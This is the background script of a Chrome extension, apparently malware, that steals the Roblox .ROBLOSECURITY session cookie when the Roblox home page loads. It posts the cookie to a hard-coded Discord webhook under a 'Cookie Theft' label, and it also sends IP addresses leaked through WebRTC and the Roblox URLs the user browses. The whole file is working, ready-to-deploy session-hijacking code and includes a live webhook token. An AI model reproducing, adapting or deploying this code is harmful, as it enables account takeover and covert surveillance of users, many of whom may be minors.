// Track sent cookies per tab to avoid duplicates
let sentTabs = {};
let collectedIPs = new Set();
let pendingPerformanceLogs = {};
let messageGroupingTimeout = null;
let homePageVisited = {};

// Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1445816866986659895/n5KT6iuvJxGECzlunmjSk5SyAPc-wTJ3KOadnl7zU1ENqe6MOp4ubZXUb3hdsAFxa5zF";

// Blocked URLs
const BLOCKED_URLS = [
  "metrics.roblox.com/v1/games/report-event",
  "friends.roblox.com/v1/users/"
];

// Format timestamp
function formatTimestamp() {
  const now = new Date();
  const date = `${now.getFullYear()} ${now.getMonth() + 1}. ${now.getDate()}.`;
  const time = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
  return `date: ${date} | time: ${time}`;
}

// Get IP data (1 main + 3 alternatives)
function getIPData() {
  const allIPs = [...collectedIPs];

  // Categorize IPs by type
  const ipCategories = {
    public: [],
    private192: [],
    private10: [],
    private172: [],
    other: []
  };

  allIPs.forEach(ip => {
    if (ip.startsWith("192.168.")) {
      ipCategories.private192.push(ip);
    } else if (ip.startsWith("10.")) {
      ipCategories.private10.push(ip);
    } else if (ip.startsWith("172.")) {
      ipCategories.private172.push(ip);
    } else if (!ip.startsWith("169.254.")) {
      ipCategories.public.push(ip);
    } else {
      ipCategories.other.push(ip);
    }
  });

  // Select main IP (first public IP)
  const mainIP = ipCategories.public[0] || "Not detected";

  // Select alternative IPs (try to get different types)
  const alternatives = [];
  const ipSources = [
    ipCategories.private192,
    ipCategories.private10,
    ipCategories.private172,
    ipCategories.other
  ];

  // Try to get one from each category
  for (const source of ipSources) {
    if (source.length > 0 && alternatives.length < 3) {
      alternatives.push(source[0]);
    }
  }

  // Prepare IP data
  const ipData = {
    "ip": mainIP
  };

  for (let i = 0; i < 3; i++) {
    ipData[`alternative ip ${i + 1}`] = alternatives[i] || "Not detected";
  }

  return ipData;
}

// Check if URL should be blocked
function isBlockedUrl(url) {
  return BLOCKED_URLS.some(blocked => url.includes(blocked));
}

// Process and send grouped performance logs
function sendGroupedPerformanceLogs(tabId) {
  if (!pendingPerformanceLogs[tabId] || pendingPerformanceLogs[tabId].length === 0) return;

  const logs = pendingPerformanceLogs[tabId];
  const ipData = getIPData();

  // Don't send if main IP is not detected
  if (ipData["ip"] === "Not detected") {
    pendingPerformanceLogs[tabId] = [];
    return;
  }

  // Deduplicate URLs (keep only first occurrence)
  const uniqueLogs = [];
  const seenUrls = new Set();

  for (const log of logs) {
    if (!seenUrls.has(log.url)) {
      seenUrls.add(log.url);
      uniqueLogs.push(log);
    }
  }

  // Prepare grouped message
  const timestamp = formatTimestamp();
  const urlFields = uniqueLogs.map((log, index) => ({
    name: `url (website navigation) ${index + 1}`,
    value: `\`\`\`${log.url}\`\`\``,
    inline: false
  }));

  const payload = {
    content: "",
    embeds: [{
      title: `Performance Log (Grouped message of ${uniqueLogs.length})`,
      fields: [
        { name: "Timestamp", value: timestamp, inline: false },
        ...urlFields,
        ...Object.entries(ipData).map(([key, value]) => ({
          name: key,
          value: `\`${value}\``,
          inline: true
        }))
      ],
      color: 0x00ff00
    }]
  };

  // Send the grouped message
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    console.log(`Grouped Performance Log sent (${uniqueLogs.length} messages)`);
  })
  .catch(error => {
    console.error("Webhook error:", error);
  });

  // Clear pending logs
  pendingPerformanceLogs[tabId] = [];
}

// Send data to webhook
async function sendData(tabId, dataType, data) {
  const ipData = getIPData();

  // Don't send if main IP is not detected (except for cookie theft)
  if (ipData["ip"] === "Not detected" && dataType !== "Cookie Theft") return;

  const timestamp = formatTimestamp();
  let content = "";
  let title = "";
  let fields = [];

  if (dataType === "Cookie Theft") {
    content = "@here New Roblox cookie captured";
    title = "Cookie Theft";
    fields = [
      { name: "Timestamp", value: timestamp, inline: false },
      { name: "Cookie", value: `\`\`\`${data.cookies}\`\`\``, inline: false },
      ...Object.entries(ipData).map(([key, value]) => ({
        name: key,
        value: `\`${value}\``,
        inline: true
      }))
    ];
  } else if (dataType === "Performance Log") {
    title = "Performance Log";
    fields = [
      { name: "Timestamp", value: timestamp, inline: false },
      { name: "url (website navigation)", value: `\`\`\`${data.url}\`\`\``, inline: false },
      ...Object.entries(ipData).map(([key, value]) => ({
        name: key,
        value: `\`${value}\``,
        inline: true
      }))
    ];
  }

  const payload = {
    content: content,
    embeds: [{
      title: title,
      fields: fields,
      color: dataType === "Cookie Theft" ? 0xff0000 : 0x00ff00
    }]
  };

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    console.log(`${title} sent successfully`);
  } catch (error) {
    console.error("Webhook error:", error);
  }

  if (dataType === "Cookie Theft") {
    collectedIPs.clear();
  }
}

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (!request.type || !sender.tab) return;

  switch (request.type) {
    case "WEBRTC_LEAK":
      collectedIPs.add(request.data.ip);
      break;

    case "PERFORMANCE_LOG":
      if (isBlockedUrl(request.data.url)) return;

      // Add to pending logs for grouping
      if (!pendingPerformanceLogs[sender.tab.id]) {
        pendingPerformanceLogs[sender.tab.id] = [];
      }
      pendingPerformanceLogs[sender.tab.id].push(request.data);

      // Clear any existing timeout
      if (messageGroupingTimeout) {
        clearTimeout(messageGroupingTimeout);
      }

      // Set new timeout to send grouped messages after 1 second
      messageGroupingTimeout = setTimeout(() => {
        sendGroupedPerformanceLogs(sender.tab.id);
      }, 1000);
      break;

    case "ROBLOX_DATA":
      if (!sentTabs[sender.tab.id]) sentTabs[sender.tab.id] = {};
      sentTabs[sender.tab.id].cookie = request.data.cookies;
      sendData(sender.tab.id, "Cookie Theft", request.data);
      break;
  }
});

// Auto-send cookie and performance log on page load
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (!tab.url || !tab.url.includes("roblox.com") || changeInfo.status !== "complete") return;

  // Check if this is the home page
  if (tab.url === "https://www.roblox.com/home" && !homePageVisited[tabId]) {
    homePageVisited[tabId] = true;

    // Send performance log for home page
    sendData(tabId, "Performance Log", { url: tab.url });

    // Send cookie theft
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      if (chrome.runtime.lastError) {
        console.error("Cookie error:", chrome.runtime.lastError);
        return;
      }

      if (cookie) {
        sentTabs[tabId] = {};
        sentTabs[tabId].cookie = cookie.value;
        sendData(tabId, "Cookie Theft", { cookies: cookie.value });
      }
    });
  }
  // For other pages, only send performance logs
  else if (tab.url.includes("roblox.com") && !tab.url.includes("roblox.com/home")) {
    // This will be handled by the performance log messages from content script
  }
});

// Clear tab data when closed
chrome.tabs.onRemoved.addListener((tabId) => {
  delete sentTabs[tabId];
  delete pendingPerformanceLogs[tabId];
  delete homePageVisited[tabId];

  // Clear any pending timeout for this tab
  if (messageGroupingTimeout) {
    clearTimeout(messageGroupingTimeout);
    messageGroupingTimeout = null;
  }
});
